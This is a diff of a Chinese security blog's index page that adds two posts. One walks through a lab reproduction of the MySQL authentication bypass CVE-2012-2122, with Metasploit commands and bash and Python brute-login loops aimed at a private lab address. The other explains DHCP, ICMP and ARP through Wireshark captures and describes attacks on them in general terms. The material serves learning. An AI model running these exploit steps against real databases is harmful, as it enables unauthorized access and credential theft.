@@ -124,7 +124,7 @@
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">16</span></a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">19</span></a>
 
   </li>
         <li class="menu-item menu-item-categories">
@@ -134,7 +134,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">8</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">10</span></a>
 
   </li>
   </ul>
@@ -162,6 +162,356 @@
 
           <div class="content index posts-expand">
             
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/author.jpg">
+      <meta itemprop="name" content="swanQ">
+      <meta itemprop="description" content="Try & Enjoy">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SwanQ's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">MYSQL提权总结</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-04-15 20:10:49" itemprop="dateCreated datePublished" datetime="2021-04-15T20:10:49+08:00">2021-04-15</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-04-16 17:15:43" itemprop="dateModified" datetime="2021-04-16T17:15:43+08:00">2021-04-16</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="MYSQL漏洞案例："><a href="#MYSQL漏洞案例：" class="headerlink" title="MYSQL漏洞案例："></a>MYSQL漏洞案例：</h1><p>先通过MYSQL身份认证绕过漏洞 CVE-2012-2122开始看起。</p>
+<h2 id="1-漏洞原理："><a href="#1-漏洞原理：" class="headerlink" title="1. 漏洞原理："></a>1. 漏洞原理：</h2><p>该漏洞是身份认证绕过漏洞，当连接MariaDB/MySQL时，输入的密码会与期望的正确密码比较，由于处理不正确，会导致memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的。即只要知道用户名，不断尝试就能够直接登入SQL数据库。</p>
+<h2 id="2-影响版本："><a href="#2-影响版本：" class="headerlink" title="2. 影响版本："></a>2. 影响版本：</h2><p>Mariadb、Mysql：5.1.61，5.0.11，5.3.5，5.5.22</p>
+<h2 id="3-漏洞复现："><a href="#3-漏洞复现：" class="headerlink" title="3. 漏洞复现："></a>3. 漏洞复现：</h2><p>靶机：Ubuntu 192.168.127.131</p>
+<p>攻击机：kali 192.168.127.130</p>
+<p>环境：docker  vulhub</p>
+<blockquote>
+<p>注：</p>
+<p>[1]除了安装docker-ce docker-io之外，可能需要安装docker-compose</p>
+<p>[2]docker-compose是docker的命令行工具，docker-compose up启动并运行vulhub中的mysql服务。</p>
+<p>[3]进入docker：docker exec -it 69d1 bash</p>
+</blockquote>
+<p> <img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/1.png" alt="img"></p>
+<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2.png" alt="img"></p>
+<p>环境启动后，将启动一个Mysql服务（版本：5.5.23），监听3306端口，通过Mysql客户端可直接登录，其root密码是123456。至此靶机环境搭建完成</p>
+<p>攻击机扫描靶机所开放服务：</p>
+<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/3.png" alt="img"></p>
+<p>可看到linux服务器开启了mysql，版本为5.5.23</p>
+<h3 id="方法一、用msf直接跑："><a href="#方法一、用msf直接跑：" class="headerlink" title="方法一、用msf直接跑："></a>方法一、用msf直接跑：</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search mysql</span><br><span class="line">use auxiliary/scanner/mysql/mysql_authbypass_hashdump</span><br><span class="line">set RHOSTS 192.168.127.131</span><br><span class="line">set threads 10</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/4.png" alt="img"></p>
+<p>可以看到密码的哈希值，一般密码以MD5的格式</p>
+<blockquote>
+<p>注：</p>
+<p>[1] MD5加密结果是128位二进制，也就是32位十六进制数</p>
+<p>[2] SHA-1加密结果是160位二进制，也就是40位十六进制数</p>
+<p>[3] SHA-256加密结果是256位二进制，也就是64位十六进制数</p>
+<p>[4] SHA-512加密结果是512位二进制，也就是128位十六进制数</p>
+<p>[5] RIPEMD160加密结果是160位二进制，也就是40位十六进制数</p>
+</blockquote>
+<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/5.png" alt="img"></p>
+<p>MD5解密</p>
+<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/6.png" alt="img"></p>
+<h3 id="方法二、利用bash脚本自动登陆mysql数据库"><a href="#方法二、利用bash脚本自动登陆mysql数据库" class="headerlink" title="方法二、利用bash脚本自动登陆mysql数据库"></a>方法二、利用bash脚本自动登陆mysql数据库</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 用一个错误的密码登录1000次目标主机的mysql数据库</span></span><br><span class="line">for ((i = 1; i &lt; 1000; i++)) </span><br><span class="line">do</span><br><span class="line">        echo &quot;= = = = = = = = = = = = = = = = = = = = = = = = = = = = =&quot;;</span><br><span class="line">        mysql -h 192.168.127.131 -u root -p111111 -P 3306;</span><br><span class="line">        echo &quot;= = = = = = = = = = = = = = = = = = = = = = = = = = = = =&quot;;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/7.jpg" alt="img"></p>
+<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/8.jpg" alt="img"></p>
+<h3 id="方法三、Python脚本："><a href="#方法三、Python脚本：" class="headerlink" title="方法三、Python脚本："></a>方法三、Python脚本：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#！/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">subprocess.Popen(<span class="string">&quot;mysql -u root -P 3306 -h 192.168.127.131 --password=aaaaa&quot;</span>, shell=<span class="literal">True</span>).wait()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/9.jpg" alt="img"></p>
+<h1 id="UDF-提权"><a href="#UDF-提权" class="headerlink" title="UDF 提权"></a>UDF 提权</h1><p>UDF（user defined function）用户自定义函数。用户通过自定义函数可以实现在 MySQL 中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像调用本机函数 version()那样方便。 由于是用户自定义的函数，所以我们可以利用UDF创建一个执行命令的函数。</p>
+<h2 id="手工复现"><a href="#手工复现" class="headerlink" title="手工复现"></a>手工复现</h2><p>漏洞修复：<br>MySQL数据库更新到最新版本<br>禁止除白名单外其他ip远程登录MySQL数据库<br>修改数据库用户名</p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://my.oschina.net/bylibrary/blog/4967585">https://my.oschina.net/bylibrary/blog/4967585</a></p>
+<p><a target="_blank" rel="noopener" href="https://yeasy.gitbook.io/docker_practice/container">https://yeasy.gitbook.io/docker_practice/container</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/a4f25b2d74e6">https://www.jianshu.com/p/a4f25b2d74e6</a> </p>
+<p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub">https://github.com/vulhub/vulhub</a> </p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/04/15/2021-04-15/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/author.jpg">
+      <meta itemprop="name" content="swanQ">
+      <meta itemprop="description" content="Try & Enjoy">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SwanQ's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/04/15/2021-04-15/" class="post-title-link" itemprop="url">一篇文章搞懂所有协议</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-04-15 15:23:58 / 修改时间：15:44:59" itemprop="dateCreated datePublished" datetime="2021-04-15T15:23:58+08:00">2021-04-15</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="0x01-DHCP协议"><a href="#0x01-DHCP协议" class="headerlink" title="0x01 DHCP协议"></a>0x01 DHCP协议</h1><p><strong>局域网内分配ip</strong></p>
+<p><strong>一、动态主机配置协议DHCP</strong></p>
+<p><strong>1.DHCP简介</strong></p>
+<p>​        DHCP(Dynamic Host Configuration Protocol),动态主机配置协议，是一个应用层协议。当我们将客户主机ip地址设置为动态获取方式时，DHCP服务器就会根据DHCP协议给客户端分配IP，使得客户机能够利用这个IP上网。</p>
+<p>​       DHCP的前身是BOOTP协议（Bootstrap Protocol）,BOOTP被创建出来为连接到网络中的设备自动分配地址，后来被DHCP取代了，DHCP比BOOTP更加复杂，功能更强大。后面可以看到，在用Wireshark过滤显示DHCP包，需要输入过滤条件BOOTP，而不是DHCP,但或许是因为我使用的Wireshark版本是比较旧的1.12.9,没有在新版本中尝试过，也许可以输入DHCP让其只显示DHCP包。</p>
+<p><strong>2.工作原理</strong></p>
+<p><img src="/2021/04/15/2021-04-15/1.png" alt="img"></p>
+<p>DHCP的实现分为4步： </p>
+<p>第一步：Client端在局域网内发起一个DHCP　Discover包，目的是想发现能够给它提供IP的DHCP Server。 </p>
+<p>第二步：可用的DHCP Server接收到Discover包之后，通过发送DHCP Offer包给予Client端应答，意在告诉Client端它可以提供IP地址。 </p>
+<p>第三步：Client端接收到Offer包之后，发送DHCP Request包请求分配IP。 </p>
+<p>第四步：DHCP Server发送ACK数据包，确认信息。</p>
+<p><strong>二、利用Wireshark抓取DHCP包</strong></p>
+<p><strong>1.分析</strong></p>
+<p>要想抓取到DHCP包，先要保证有可用的DHCP服务器，然后将主机IP地址获取方式设置为自动获取。如果主机在抓包之前已经联网，需要先断开主机的网络连接，然后再连接网络。</p>
+<p>cmd中可以使用ipconfig /?查看各参数的含义： </p>
+<p><img src="/2021/04/15/2021-04-15/9.png" alt="img"></p>
+<p><strong>(1)ipconfig /release</strong> </p>
+<p>断开当前的网络连接，主机IP变为0.0.0.0，主机与网络断开，不能访问网络。 </p>
+<p><img src="/2021/04/15/2021-04-15/2.png" alt="img"></p>
+<p><strong>(2)ipconfig /renew</strong> </p>
+<p>更新适配器信息，请求连接网络，这条命令结束之后，主机会获得一个可用的IP，再次接入网络。</p>
+<p><strong>2.开始抓包</strong></p>
+<p>实验环境：Win10专业版,Wireshark3.2.7，有线连接 </p>
+<p>DHCP服务器IPv4地址：10.170.72.254</p>
+<p>本机被分配IP：10.170.56.55</p>
+<p><strong>(1)在Wireshark中点击start开始抓包，在过滤栏输入bootp，使其只显示DHCP数据包。</strong> </p>
+<p><strong>(2)在cmd中输入ipconfig  /release 断开网络连接。</strong></p>
+<p><img src="/2021/04/15/2021-04-15/3.jpg" alt="img"></p>
+<p>可以看到此时所有的网卡都已经断开。以太网处于断开状态。 由于开了虚拟机的原因，Wireshark中截获到一个DHCP Release数据包。</p>
+<p><strong>(3)在cmd中输入ipconfig /renew 请求网络连接。</strong></p>
+<p>此时，可以看到在Wireshark中新增了4个DHCP数据包： </p>
+<p><img src="/2021/04/15/2021-04-15/10.jpg" alt="img"></p>
+<p>数据包1：DHCP Discover </p>
+<p>数据包2：DHCP Offer </p>
+<p>数据包3：DHCP Request </p>
+<p>数据包4：DHCP ACK</p>
+<p>注：当直接手动连接wifi时，直接发起request包(另一台pc)</p>
+<p><img src="/2021/04/15/2021-04-15/4.png" alt="img"></p>
+<p>等待这条命令执行完毕之后，在cmd中可以看到主机被分配了IP，主机成功连入网络中。</p>
+<p><img src="/2021/04/15/2021-04-15/5.jpg" alt="img"></p>
+<p><strong>(4)为了后续分析使用，我们再执行一次ipconfig /renew：</strong> </p>
+<p>可以看到Wireshark中新增了3个数据包：DHCP ACK；DHCP Request;DHCP ACk。如果再次使用ipconfig /renew,<strong>每执行一次会新增2个数据包：DHCP Request;DHCP ACK</strong>。</p>
+<p><strong>三、DHCP包分析</strong></p>
+<p>下面着重来分析当执行，ipconfig /renew这条命令产生的4个DHCP数据包，这4个数据包代表了客户机和DHCP服务器的交互过程，也是IP动态分配的过程。 </p>
+<p><strong>1.DHCP Discover数据包</strong> </p>
+<p>(1)Client端使用IP地址0.0.0.0发送了一个广播包，可以看到此时的目的IP为255.255.255.255。Client想通过这个数据包发现可以给它提供服务的DHCP服务器。</p>
+<p>(2)从下图可以看出，DHCP属于应用层协议，它在传输层使用UDP协议，目的端口是67。</p>
+<p><img src="/2021/04/15/2021-04-15/11.png" alt="img"></p>
+<p><strong>2.DHCP Offer包</strong> </p>
+<p>当DHCP服务器收到一条DHCP Discover数据包时，用一个DHCP Offer包给予客户端响应。 </p>
+<p><img src="/2021/04/15/2021-04-15/6.png" alt="img"></p>
+<p> (1)DHCP服务器使用广播地址作为目的地址，因为此时请求分配IP的Client并没有自己ip,而可能有多个Client在使用0.0.0.0这个IP作为源IP向DHCP服务器发出IP分配请求，DHCP也不能使用0.0.0.0这个IP作为目的IP地址，于是依然采用广播的方式，告诉正在请求的Client们，这是一台可以使用的DHCP服务器。</p>
+<p>(2)DHCP服务器<strong>提供了一个可用的IP</strong>,在数据包的Your (client) IP Address字段可以看到DHCP服务器提供的可用IP。</p>
+<p>(3)除此之外，如图中红色矩形框的内容所示，服务器还发送了子网掩码，路由器，DNS，域名，IP地址租用期等信息。</p>
+<p><strong>3.DHCP Request包</strong> </p>
+<p>当Client收到了DHCP Offer包以后（如果有多个可用的DHCP服务器，那么可能会收到多个DHCP Offer包），确认有可以和它交互的DHCP服务器存在，于是Client发送Request数据包，请求分配IP。 </p>
+<p><img src="/2021/04/15/2021-04-15/7.png" alt="img"></p>
+<p>此时的源IP和目的IP依然是0.0.0.0和255.255.255.255。</p>
+<p><strong>4.DHCP ACK包</strong> </p>
+<p>服务器用DHCP ACK包对DHCP请求进行响应。 </p>
+<p><img src="/2021/04/15/2021-04-15/8.png" alt="img"></p>
+<p>在数据包中包含以下信息，表示将这些资源信息分配给Client. </p>
+<p><strong>Your(client) IP address:分配给Client的可用IP</strong></p>
+<p>后面有许多项option信息，前两项是DHCP服务器发送的消息类型（ACK）和服务器的身份标识，后面几项是： </p>
+<p>Subnet Mask:Client端分配到的IP的子网掩码； </p>
+<p>Router:路由器 </p>
+<p>Domain Name Server:DNS,域名服务器 </p>
+<p>Domain Name:域名 </p>
+<p>IP Address Lease Time:IP租用期。</p>
+<p><strong>四、DHCP starvation attack</strong></p>
+<p><strong>1.DHCP starvation attack，DHCP饥饿攻击</strong> </p>
+<p>有许多中攻击DHCP的技术，这里介绍其中一种，有点类似于SYN 洪范攻击。 </p>
+<p><strong>DHCP starvation attack</strong>，中文即DHCP饥饿攻击，就是大量地进食，把可以吃的食物全部吃完，然后让其他人没得吃，最后给其他人提供一些毒药，把人家毒死。</p>
+<p>下面来说这种攻击是如何实现的。一些不法分子，伪造合法的MAC地址，不断地向DHCP服务器发出DHCP Request包，最后<strong>耗尽服务器的可用IP</strong>,于是原有的这台DHCP服务器便不能够给客户端分配IP了，此时不法分子再伪造一台DHCP服务器，给客户端分配IP,将客户端的默认网关和DNS都设置成自己的机器，于是便可以对客户端进行<strong>中间人攻击</strong>。</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/zqixiao_09/article/details/77131239">https://blog.csdn.net/zqixiao_09/article/details/77131239</a></p>
+<h1 id="0x02-ICMP协议"><a href="#0x02-ICMP协议" class="headerlink" title="0x02　ICMP协议"></a>0x02　ICMP协议</h1><p><strong>一、动态主机配置协议ICMP  不可靠</strong></p>
+<p><strong>1.ICMP简介</strong></p>
+<p>​        网络控制消息协议（Internet Control Message Protocol，ICMP）是网路协议族的核心协议之一。它用于TCP/IP网络中发送控制消息，提供可能发生在通信环境中的各种问题反馈，令管理者可以对所发生的问题作出诊断并采取适当的措施。</p>
+<p>​       ICMP 依靠IP来完成它的任务，它是IP的主要部分。它与传输协议，如TCP和UDP显著不同：它一般不用于在两点间传输数据。仅ping和traceroute会用到。 IPv4中的ICMP被称作ICMPv4，IPv6中的ICMP则被称作ICMPv6。</p>
+<p>​        ICMP是在RFC 792中定义的互联网协议族之一。通常用于返回的错误信息或是分析路由。ICMP错误消息总是包括了源数据并返回给发送者。 ICMP错误消息的例子之一是TTL值过期。每个路由器在转发数据报的时候都会把IP包头中的TTL值减一。如果TTL值为0，“TTL在传输中过期”的消息将会回报给源地址。 每个ICMP消息都是直接封装在一个IP数据包中的，因此，和UDP一样，ICMP是不可靠的。</p>
+<p>​        虽然ICMP是包含在IP数据包中的，但是对ICMP消息通常会特殊处理，会和一般IP数据包的处理不同，而不是作为IP的一个子协议来处理。在很多时候，需要去查看ICMP消息的内容，然后发送适当的错误消息到那个原来产生IP数据包的程序，即那个导致ICMP讯息被传送的IP数据包。</p>
+<p>​        很多常用的工具是基于ICMP消息的。</p>
+<ul>
+<li><strong>traceroute是通过发送包含有特殊的TTL的包，然后接收ICMP超时消息和目标不可达消息来实现的。</strong></li>
+<li><strong>ping则是用ICMP的”Echo request”（类别代码：8）和”Echo reply”（类别代码：0）消息来实现的。</strong>ping是一款用于检测一个设备可连接性的工具，用于发送ICMP echo请求数据包。</li>
+</ul>
+<p><strong>二、利用Wireshark抓取DHCP包</strong></p>
+<p><strong>1.ping分析</strong></p>
+<p>ping自己服务器</p>
+<p><img src="/2021/04/15/2021-04-15/21.png" alt="img"></p>
+<p><strong>(1)echo ping请求包request</strong></p>
+<p><img src="/2021/04/15/2021-04-15/22.png" alt="img"></p>
+<p> ICMP头部的Type以及Code的内容:</p>
+<ol>
+<li>Type表示ICMP消息基于RFC规范的类型或分类。</li>
+<li>Code表示ICMP消息基于RFC规范的子类型。</li>
+<li>ICMP头部中的Type的值是8，Code值是0，说明是一个echo请求数据包，所包含的数据很少。除了指定的类型、代码以及校验和，这里还有序列号用于匹配请求和响应，并且在可变域中包含有一串随机字符串。</li>
+</ol>
+<p><strong>(2)echo ping reply响应包</strong></p>
+<p><img src="/2021/04/15/2021-04-15/23.png" alt="img"></p>
+<ol>
+<li>ICMP头部中，类型和代码的值都是0，表示这是一个echo响应。</li>
+<li>第二个数据包的序列号和第一个数据包匹配，确定对应关系</li>
+<li>Data的部分，这个数据包和第一个数据包字符相同。说明数据包被成功接收，ping成功。</li>
+</ol>
+<p><strong>2.安全问题</strong></p>
+<p>​        ICMP协议本身的特点就决定了它易于攻击网络上的路由器和主机。</p>
+<ol>
+<li>DDoS：用户可以利用操作系统规定的ICMP数据包的最大尺寸不超过64K这个规定，向网络上的主机发起Ping of Death攻击。因为当ICMP数据包的大小超过64K的时候，目标主机就有可能出现内存分配的错误的情况，导致TCP/IP堆栈崩溃，使得主机死机。</li>
+<li>ICMP风暴：向目标主机长时间、连续、大量地发送ICMP数据包，也会最终使系统瘫痪。大量的ICMP数据包会形成“ICMP风暴”，耗费目标主机大量的CPU资源。</li>
+<li>ICMP的echo请求使用的字符串可被利用，攻击者可使用这段内容来推测设备所使用的操作系统。或放置一些数据位用作反向连接。</li>
+</ol>
+<p><strong>2.路由跟踪</strong></p>
+<p><img src="/2021/04/15/2021-04-15/24.png" alt="img"></p>
+<p>​       路由跟踪识别一个设备到另一个设备的路径。对于溯源来说，确定数据包从一个地方到另一个地方所走的路径是异常重要的。</p>
+<p>​       tracert：利用了ICMP协议，通过其跟踪结果，我们就可以画出数据包所走的路径。总共经过9个跃点到达目标IP </p>
+<p>(1)第一个数据包：192.168.137.44 –&gt; 192.168.137.1</p>
+<p><img src="/2021/04/15/2021-04-15/25.png" alt="img"></p>
+<p>​        类比于此前分析的echo请求。这个数据包是从IP地址为192.168.137.44到47.95.28.98的简单的echo的请求，并且ICMP数据包头部的每一部分都与echo请求数据包相同。数据包的<strong>IP头中的TTL的值为1：****这个数据包会在它所遇到的第一个路由器的地方被丢弃</strong>。由于目标地址47.95.28.98是外网地址，肯定至少存在一个路由器，因此这个数据包不会到达目的地。</p>
+<p>(2)第二个数据包： 192.168.137.1 –&gt;192.168.137.44</p>
+<p><img src="/2021/04/15/2021-04-15/26.png" alt="img"></p>
+<p>​       此数据包是在前往目的地的路径上，第一个路由器发回的reply响应。由于第一个数据包到达192.168.137.1后，TTL的值变成了0，因此就不能够继续传输，此时路由器就回复了一个ICMP响应。这个数据包的类型是11，代码是0，告诉我们这个数据包的TTL在传输中超时，所以目标地址不可达。</p>
+<p>​    <strong>ICMP双头包：</strong>在ICMP的结尾部分包含了原echo请求的IP头和ICMP数据的拷贝。因此这个数据包也被叫做ICMP双头包，表示包含有两个ICMP的包头信息。双包头信息在网络故障检修的时候会非常有用。</p>
+<p>(3)第三个数据包：找192.168.137.44</p>
+<p><img src="/2021/04/15/2021-04-15/27.png" alt="img"></p>
+<p>​        TTL为2，保证此数据包到达第二跳的路由。但是即便TTL的值变成了2，从下面的数据包来看，它也是无法到达目的地，直至TTL的值增长到9，这个数据包才到达了目的地。</p>
+<p>(4)响应： 192.168.137.1 –&gt;10.170.72.254</p>
+<p><img src="/2021/04/15/2021-04-15/28.png" alt="img"></p>
+<p>为何在此之前由两个数据包TTL为3呢？说明第二跳已经找到，开始物色第三跳，只不过回应时间稍长而已。</p>
+<p>(5)找第三跳</p>
+<p>(6)第三跳响应：172.16.255.242–&gt;192.168.137.44</p>
+<p><img src="/2021/04/15/2021-04-15/29.png" alt="img"></p>
+<p>(6)第四跳响应：113.140.11.97–&gt;192.168.137.44</p>
+<p>之后如上</p>
+<h1 id="0x03-地址解析协议ARP"><a href="#0x03-地址解析协议ARP" class="headerlink" title="0x03　地址解析协议ARP**"></a>0x03　地址解析协议ARP**</h1><p><strong>1.ARP简介</strong></p>
+<p>​          ARP：<strong>IP地址解析为物理地址</strong>（MAC地址）。这里之所以需要使用MAC地址，是因为网络中用于连接各个设备的交换机使用了内容可寻址存储器（CAM，Coment Addressable Memory）。该存储器维护的ARP表列出了它在每一个端口的所有连接设备的MAC地址。</p>
+<p>​         当<strong>交换机</strong>收到了一个指向特定MAC地址的网络流量，它就会使用这个表，来确定应该使用哪一个端口发送流量。如果目标MAC地址是未知的，那么这个传输设备会首先在它的缓存中查找这个地址，如果没有找到，那么这个地址就需要通过在网络上额外的通信中解析了。或者我们可以结合下图来说明这个问题：</p>
+<p><img src="/2021/04/15/2021-04-15/31.png" alt="img"></p>
+<p>​             OSI模型将网络分为了七层，而IP地址位于第三层，也就是网络层，MAC地址位于数据链路层，也就是第二层。那么在通过以太网发送IP数据包的时候，需要首先封装第三层和第二层的报头。但由于发送数据包时只知道目标IP地址，不知道其MAC地址，而又不能直接跨越第二、三层，所以需要地址解析协议。而在使用了ARP协议后，计算机可以按照网络层IP数据包的头部信息，将硬件地址信息（MAC地址）对应起来，以保证通信的顺利进行。ARP协议的基本功能就是将一个已知的IP地址解析成MAC地址，以便主机之间可以正常地通信。</p>
+<p>​            ARP协议是在RFC826中定义的。<strong>RFC（Request for Comments）是定义各种协议实现标准的官方文档</strong>。可在RFC Editor的首页搜索RFC文档。</p>
+<p><strong>2.工作原理</strong></p>
+<p>通过查看RFC826可以知道，其实ARP协议的解析过程只使用了两种数据包：一个ARP请求和一个ARP响应，如下图所示：</p>
+<p><img src="/2021/04/15/2021-04-15/32.png" alt="img"></p>
+<p>其详细工作原理为：</p>
+<p>（1）当主机A想要给主机B发送数据时，主机A会首先在自己的<strong>本地ARP缓存表</strong>中检查与主机B相匹配的MAC地址。</p>
+<p>（2）如果主机A在自己的缓存表中没找到主机B的相关条目，那么它就要想办法获取主机B的MAC地址。这就需要将<strong>ARP的请求帧广播</strong>到本地网络上的所有主机中。这个请求<strong>帧包含有主机A的IP地址和MAC地址，以及主机B的IP地址</strong>。网络中凡是收到请求帧的主机都会检查自己的IP地址是否与请求地址一致，如果不一致，则会丢弃该请求帧。对于上图来说，主机C和主机D会丢弃主机A发出的请求帧。</p>
+<p>（3）主机B确定ARP请求中的IP地址和自己的IP地址一致，那么就会<strong>将主机A的IP地址和MAC地址添加到本地的缓存列表中</strong>。</p>
+<p>（4）主机B将包含有自己<strong>MAC地址的ARP响应消息直接回复给主机A（单播）</strong>。</p>
+<p>（5）主机A收到从主机B发来的ARP响应消息后，会<strong>将主机B的IP地址和MAC地址添加到自己的ARP缓存表中</strong>。接下来，主机A就可以向主机B发送消息了。</p>
+<p><strong>二、利用Wireshark抓取ARP包</strong></p>
+<p>查找局域网内IP：for /L %i IN (1,1,254) DO ping -w 2 -n 1 192.168.9.%i</p>
+<p>​                                 arp -a</p>
+<p><strong>1.ARP分析</strong></p>
+<p>ARP缓存表如下：</p>
+<p>本机所在局域网的ARP缓存表为192.168.9.20,每行表示一个ARP条目。缓存表有效期为１２０秒</p>
+<p><strong>主机启动时会主动发送ARP应答 刷新邻居的ARP缓存</strong></p>
+<p><img src="/2021/04/15/2021-04-15/33.png" alt="img"></p>
+<p><strong>(1)ARP请求包request</strong></p>
+<p><img src="/2021/04/15/2021-04-15/34.png" alt="img"></p>
+<p>１.Ethernet：数据包目的地址是ff:ff:ff:ff:ff:ff，广播地址，说明当前数据包会被广播到当前网段中的所有设备上。</p>
+<p>２.ARP请求的头部信息：硬件类型、协议类型、硬件地址长度、协议长度、</p>
+<p>３.操作码（该值为1，表示这是一个ARP请求包）、发送方的MAC和IP地址，以及接收方的IP地址。</p>
+<p>４.目标MAC地址还是未知的，因此就以全0的形式显示。</p>
+<p><strong>(2)ARP reply响应包</strong></p>
+<p><img src="/2021/04/15/2021-04-15/35.png" alt="img"></p>
+<p>１.目标MAC地址已更新</p>
+<p>２.操作码（Opcode）现在是2，表明这是一个用于响应的数据</p>
+<p><strong>（３）免费的ARP</strong></p>
+<p><img src="/2021/04/15/2021-04-15/36.png" alt="img"></p>
+<ol>
+<li>以广播的形式发出，网络上的所有主机都能收到它。</li>
+<li>发送方的IP地址和接收方的IP地址是一致的。网络中的其它主机收到这个数据包之后，它会让这些主机使用新的IP和MAC地址映射关系来更新它们的ARP表。</li>
+<li>由于这个ARP数据包是源主机未经请求主动发出的，并导致了目标主机更新了ARP缓存，所以称之为免费的ARP。</li>
+</ol>
+<p><strong>2.安全问题</strong></p>
+<p>​       ARP协议本身广播不验证的特点就决定了它易于攻击</p>
+<ol>
+<li>DDoS：用户可以利用操作系统规定的ICMP数据包的最大尺寸不超过64K这个规定，向网络上的主机发起Ping of Death攻击。因为当ICMP数据包的大小超过64K的时候，目标主机就有可能出现内存分配的错误的情况，导致TCP/IP堆栈崩溃，使得主机死机。</li>
+<li>ARP欺骗：向目标主机连续、大量地发送假的ARP数据包。</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
   
   
@@ -197,7 +547,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-04-15 09:12:25" itemprop="dateModified" datetime="2021-04-15T09:12:25+08:00">2021-04-15</time>
+                <time title="修改时间：2021-04-15 21:57:08" itemprop="dateModified" datetime="2021-04-15T21:57:08+08:00">2021-04-15</time>
               </span>
 
           
@@ -213,177 +563,134 @@
       
